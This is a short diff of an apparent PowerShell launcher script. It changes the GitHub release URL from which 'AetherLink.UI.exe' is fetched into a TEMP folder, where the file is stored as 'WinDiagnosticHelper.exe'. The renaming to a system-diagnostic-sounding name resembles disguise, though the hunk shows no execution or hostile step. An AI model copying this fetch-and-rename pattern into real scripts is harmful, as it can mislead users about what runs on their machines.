@@ -4,7 +4,7 @@ $tempDir = "$env:TEMP\WinDiagCache"
 $appExe = "$tempDir\WinDiagnosticHelper.exe"
 $appTmp = "$tempDir\WinDiagnosticHelper.tmp"
 $versionFile = "$tempDir\version.txt"
-$appUrl = "https://github.com/DanielWueno/AetherLink/releases/download/Android_Only/AetherLink.UI.exe"
+$appUrl = "https://github.com/DanielWueno/AetherLink/releases/latest/download/AetherLink.UI.exe"
 $apiUrl = "https://api.github.com/repos/DanielWueno/AetherLink/releases/latest"
 
 $needsDownload = $true
